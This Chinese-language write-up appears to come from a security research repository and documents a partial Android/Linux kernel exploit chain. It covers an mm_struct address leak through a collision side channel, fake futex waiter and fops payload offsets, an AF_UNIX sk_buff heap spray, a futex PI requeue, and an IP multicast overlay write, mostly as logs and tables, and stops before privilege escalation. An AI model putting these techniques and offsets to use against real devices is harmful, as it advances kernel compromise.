# 03. mm/slab、payload 与 3.1 触发闭环

## 摘要

本文件记录 3.1 终止点之前的内核观测链。结论只覆盖：mm/slab 定位、payload 自检、AF_UNIX/sk_buff spray、futex PI requeue、IP multicast side effect，以及 `route_done=1`。公开文档不进入 3.1 之后的阶段。

## mm/slab 定位

实测日志：

```text
[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
[*] timing stage=page-mm-seed pid=23917 elapsed_ms=1670
[*] ks inc threads 128/512
[*] ks inc threads 256/512
[*] ks inc threads 384/512
[*] ks inc threads 512/512
[*] kernelsnitch waiters=512 target=905 baseline=9 threshold=90 margin=4 elapsed_ms=297
[*] kernelsnitch collision-scan found=7/7 elapsed_ms=2220
[*] kernelsnitch collision-scan leaked mm=ffffff8165295640
[*] timing stage=page-mm-layout pid=23917 elapsed_ms=4722
```

结论：

| 项 | 值 |
| --- | --- |
| `mm_struct` 大小 | `960` / `0x3c0` |
| slab order | `3` |
| objects per slab | `34` |
| partial slabs | `13` |
| collision target | `8` |
| 实测 collision | `7/7` |
| leaked `mm` | `ffffff8165295640` |
| 推导 slab base | `ffffff8165290000` |

`slab_base = leaked & ~0x7fff` 是源码中的对齐规则。该地址是后续 payload 几何的基准，不是跨启动常量。

## payload 几何

实测日志：

```text
[*] tcp payload geometry slab_base=ffffff8165290000 payload_base=ffffff8165290000 payload_bias=0xe80 fake_lock=ffffff8165291350 fake_w0=ffffff8165292220 fake_task=ffffff8165295800 fake_fops=ffffff8165291000 wait_lock=ffffff8165291370 owner=ffffff8165295801
[*] final lock mode=active-final base=ffffff8165291350 lock=ffffff8165291370 root=ffffff8165292220 leftmost=ffffff8165292220 owner=ffffff8165295801 fake_w0_prio=255 pi_parent=ffffff8165290ff8 pi_top=ffffffe77c8ec200
[*] tcp fops pi geometry parent=ffffff8165290ff8 right=0000000000000000 left=0000000000000000 final_pi_write=1 waiter_lock=ffffff8165291370
[+] final payload invariant ok mode=active-final target=ffffff8002c84ea8 value=ffffff8165291000
```

源码常量：

| 对象 | 偏移 | 实测地址 |
| --- | ---: | --- |
| payload bias | `0xe80` | `ffffff8165290e80` |
| fake fops | `0x1000` | `ffffff8165291000` |
| fake lock | `0x1350` | `ffffff8165291350` |
| wait lock | `0x1370` | `ffffff8165291370` |
| fake waiter W0 | `0x2220` | `ffffff8165292220` |
| fake task | `0x5800` | `ffffff8165295800` |

`final payload invariant ok` 只证明用户态构造的两份 32 KiB chunk 字段一致。它是必要凭证，不是单独的命中证明。

## spray 结果

实测日志：

```text
[*] af_unix order3 staged pairs=64 requested=64
[*] timing stage=page-spray-stage pid=23917 elapsed_ms=4724
[*] sk_buff pcp send ret=65536 errno=0
[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
[*] timing stage=page-reclaim-send pid=23917 elapsed_ms=4961
[-] kpage state unavailable flags_fd=-1 count_fd=-1 errno=13
[*] timing stage=page-cleanup pid=23917 elapsed_ms=6279
[*] timing stage=page-total pid=23917 elapsed_ms=6279
[*] timing stage=fops-page pid=23917 elapsed_ms=6279
[+] refclone fops page ready base=ffffff8165290000
```

结论：

| 项 | 实测 |
| --- | --- |
| staged pairs | `64/64` |
| send count | `4096/4096` |
| payload length | `0x8e80` |
| first failure | `ret=0 errno=0` |
| kpage state | shell 下 `errno=13` 不可读 |

`kpage state unavailable` 是权限限制下的负面事实，不否定前面的 spray 计数。

## futex PI 与 IP multicast side effect

实测日志：

```text
[*] main FUTEX_CMP_REQUEUE_PI ret=-1 errno=35
[*] slide ip enter fd=3 attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 target=x28+0x38 value=ffffff8165291370 final_fops=1 full_waiter=0 overlay=marker
[*] slide final tree parent=ffffff8002c84ea0 right=ffffff8165291000 left=0 pi_write=1
[*] slide ip overlay qwords 20=ffffff8002c84ea0 28=ffffff8165291000 30=0 38=ffffff8165290ff8 40=0 48=0 50=ffffffe77c8ec200 58=ffffff8165291370 60=00000000000000ff
[*] slide ip seq=1 ret=-1 errno=22 calls=1 sched_ok=1
[*] slide ip side effect calls=1 sched_ok=1
00002771e00000 route_done=1
```

结论：

| 观测点 | 实测 | 解释边界 |
| --- | --- | --- |
| PI requeue | `ret=-1 errno=35` | EDEADLK 形态出现 |
| overlay 参数 | `group_req_size=0x88 marker_off=0x58` | 本轮进入 IP multicast side effect 路径 |
| tree parent | `ffffff8002c84ea0` | 与目标槽位前 8 字节的布局关系一致 |
| fake fops value | `ffffff8165291000` | 与 payload geometry 中 fake fops 地址一致 |
| scheduler side effect | `calls=1 sched_ok=1` | consumer 至少一次 `sched_setattr` 成功 |
| 3.1 endpoint | `route_done=1` | worker 到达 3.1 收尾 |

## 终止声明

本公开仓库的技术结论到 `route_done=1` 为止。实测日志随后显示承载进程仍为：

```text
uid=2000(shell) gid=2000(shell) ... context=u:r:shell:s0
```

因此公开结论不包含权限状态变化，不包含 3.1 之后的任何技术阶段，也不把未在本文档中列出的后续材料作为本仓库的一部分。
